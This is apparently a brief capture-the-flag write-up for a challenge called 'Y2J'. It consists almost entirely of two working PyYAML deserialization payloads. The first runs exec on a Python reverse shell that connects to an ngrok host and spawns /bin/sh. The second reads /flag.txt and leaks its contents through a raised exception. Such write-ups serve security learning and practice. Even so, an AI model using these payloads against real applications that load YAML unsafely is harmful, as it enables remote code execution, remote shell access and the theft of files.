# Y2J

Reverse shell like this:

```yaml
!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:exec
  - [ "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.us-cal-1.ngrok.io',15632));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')" ]
```

Flag is in `/flag.txt` .. better yet:

```yaml
!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:exec
  - [ 'raise ValueError(getattr(open("/flag\x2etxt"), "read")())' ]
```